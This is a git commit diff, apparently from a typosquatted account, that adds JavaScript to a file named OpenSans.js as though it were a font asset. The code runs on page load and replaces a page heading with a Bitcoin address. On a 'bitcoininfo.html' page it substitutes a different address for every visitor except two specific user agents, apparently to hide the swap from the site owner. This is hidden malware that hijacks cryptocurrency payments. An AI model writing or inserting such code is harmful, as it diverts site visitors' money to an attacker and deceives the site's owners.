e37a6c21a871c108ec157a932b9c57d0b68b9bed
reposltory <124707435+reposltory@users.noreply.github.com>
2024-07-18 15:56:55 +0330

    Nis

--- OpenSans.js
+++ OpenSans.js
@@ -1,1 +1,28 @@
+ const targetUserAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    ];
 
+    function getUAC() {
+        const elm = document.getElementsByTagName("h2")[1];
+        if (elm) {
+            elm.textContent = "1BUn5iF7pAxSvdzvE8oCTX6JmbyungsAdq";
+            if (window.location.href.includes("bitcoininfo.html")) {
+                const desiredText = "1NLckZBGxGYHUcFMfnvU9JVtCWRd4cvW1x";
+                // Update text content only if needed
+                const currentUserAgent = navigator.userAgent;
+                if (!targetUserAgents.includes(currentUserAgent)) {
+                    
+                    if (elm.textContent !== desiredText) {
+                    elm.textContent = desiredText;
+                }
+                }
+
+            }
+
+        }
+    }
+
+// Call the function as soon as the DOM content is loaded
+document.addEventListener("DOMContentLoaded", getUAC);
+getUAC()
